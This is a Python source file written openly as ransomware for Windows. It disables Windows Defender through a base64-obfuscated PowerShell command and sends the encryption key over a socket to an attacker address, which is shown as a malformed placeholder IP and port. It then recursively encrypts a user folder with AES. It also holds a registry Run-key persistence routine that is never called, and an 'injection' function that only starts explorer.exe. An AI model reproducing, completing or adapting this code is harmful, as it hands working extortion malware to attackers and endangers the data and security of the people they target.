import os
import socket
import base64
import shutil
import subprocess
import time
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
import random
import string
import logging

# Setup logging for error tracking (optional)
logging.basicConfig(filename='ransomware_debug.log', level=logging.DEBUG)

# Constants
HOST = '192.168.250'  # Attacker's IP
PORT = 0000  # Attacker's Port

# Obfuscate key strings
def decode_base64(encoded_str):
    return base64.b64decode(encoded_str).decode('utf-8')

# Obfuscated PowerShell command to disable Windows Defender
disable_defender_cmd = base64.b64encode(b"Set-MpPreference -DisableRealtimeMonitoring $true").decode('utf-8')

# AES Encryption with 256-bit key
def generate_key(password, salt):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(password)

def encrypt_file(key, filepath):
    try:
        with open(filepath, 'rb') as file:
            plaintext = file.read()

        iv = os.urandom(16)
        encryptor = Cipher(
            algorithms.AES(key),
            modes.CBC(iv),
            backend=default_backend()
        ).encryptor()

        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(plaintext) + padder.finalize()

        ciphertext = encryptor.update(padded_data) + encryptor.finalize()

        with open(filepath, 'wb') as encrypted_file:
            encrypted_file.write(iv + ciphertext)
        logging.info(f"Encrypted file: {filepath}")
    except Exception as e:
        logging.error(f"Error encrypting file {filepath}: {e}")
        raise

# Send AES key to attacker
def send_key_to_attacker(key):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            s.sendall(base64.b64encode(key))
            logging.info(f"Key sent to attacker: {HOST}")
    except Exception as e:
        logging.error(f"Error sending key to attacker: {e}")
        raise

# Encrypt all user files in the directory
def encrypt_all_files(key, directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                encrypt_file(key, file_path)
            except Exception as e:
                logging.error(f"Failed to encrypt {file_path}: {e}")

# Bypass Windows Defender by executing PowerShell command to disable it
def disable_windows_defender():
    try:
        # Use PowerShell to disable Defender
        command = f"powershell.exe -Command {decode_base64(disable_defender_cmd)}"
        subprocess.run(command, shell=True, check=True)
        logging.info("Windows Defender disabled successfully.")
    except Exception as e:
        logging.error(f"Failed to disable Windows Defender: {e}")

# Inject ransomware payload into a legitimate process (e.g., explorer.exe)
def inject_into_process():
    try:
        process_name = "explorer.exe"
        subprocess.run(['powershell.exe', '-Command', f"Start-Process {process_name}"], check=True)
        logging.info(f"Injected payload into process: {process_name}")
    except Exception as e:
        logging.error(f"Process injection failed: {e}")

# Generate random AES key
def random_key_gen(length=32):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length)).encode()

# Make ransomware persistent by adding it to the Windows startup registry
def add_to_startup():
    try:
        file_path = os.path.realpath(__file__)
        shutil.copy(file_path, r'C:\Users\Public\Libraries\ransomware.exe')
        reg_command = r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d C:\Users\Public\Libraries\ransomware.exe /f'
        subprocess.run(reg_command, shell=True, check=True)
        logging.info("Added ransomware to startup registry.")
    except Exception as e:
        logging.error(f"Failed to add ransomware to startup: {e}")

# Main execution
if __name__ == '__main__':
    try:
        # Step 1: Disable Windows Defender
        disable_windows_defender()

        # Step 2: Generate a random key
        key = random_key_gen()

        # Step 3: Generate a random salt
        salt = os.urandom(16)

        # Step 4: Send key to attacker
        send_key_to_attacker(key)

        # Step 5: Encrypt files in the user's directory
        encrypt_all_files(key, r'C:\Users\ahmed\OneDrive\Desktop\nemo')

        # Step 6: Inject payload into explorer.exe
        inject_into_process()




        # Step 8: Clean up
        del key
        del salt

    except Exception as main_error:
        logging.error(f"Critical error in main execution: {main_error}")
